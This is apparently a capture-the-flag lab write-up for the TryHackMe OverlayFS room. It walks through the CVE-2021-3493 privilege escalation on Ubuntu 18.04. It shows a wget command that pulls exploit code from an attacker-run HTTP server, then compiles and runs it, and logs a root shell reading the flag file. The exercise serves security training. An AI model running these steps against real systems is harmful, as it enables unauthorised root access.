# Room
https://tryhackme.com/room/overlayfs

# Task 1 - What is OverlayFS
OverlayFS is a Linux kernel module that allows the system to combine several mount points into one.  It is often used with live USB and other specialist applications

# Task 2 - CVE-2021-3493 - OverlayFS Exploit
Info
* https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/

The OverlayFS module is installed by default on Ubuntu 1804 server

Practical
* Deploy vulnerable VM
* Connect with SSH
* Transfer exploit code to vulnerable VM
  * Download code https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/
  * Spin up local HTTP server for transfer: sudo python3 -m http.server 80
  * From vulnerable VM grab code: wget http://1.2.3.4/exploit.c
* Compile exploit code on vulnerable VM
  * gcc exploit.c -o exploit
* Flag exploit as executable
  * chmod +x exploit
* Run exploit
  * ./exploit

```
sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.171.239 - - [22/May/2021 18:17:29] "GET /exploit.c HTTP/1.1" 200 -
```
```
overlay@overlayfs:~$ wget http://1.2.3.4/exploit.c                                                                                                         
--2021-05-22 15:17:30--  http://1.2.3.4/exploit.c                                                                                                          
Connecting to 1.2.3.4:80... connected.                                                                                                                     
HTTP request sent, awaiting response... 200 OK                                                                                                                 
Length: 3560 (3.5K) [text/x-csrc]                                                                                                                              
Saving to: ‘exploit.c’                                                                                                                                         
                                                                                                                                                               
exploit.c                               100%[==============================================================================>]   3.48K  --.-KB/s    in 0.001s   
                                                                                                                                                               
2021-05-22 15:17:30 (3.94 MB/s) - ‘exploit.c’ saved [3560/3560]    
```
```
overlay@overlayfs:~$ gcc exploit.c -o exploit
overlay@overlayfs:~$ chmod +x exploit
overlay@overlayfs:~$ ./exploit
bash-4.4# whoami
root
bash-4.4# cat /root/flag.txt
thm{[removed]}
```

# Task 3 - Further reading
More about OverlayFS
* https://yagrebu.net/unix/rpi-overlay.md
* https://wiki.archlinux.org/title/Overlay_filesystem
More about the exploit
* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3493
* https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/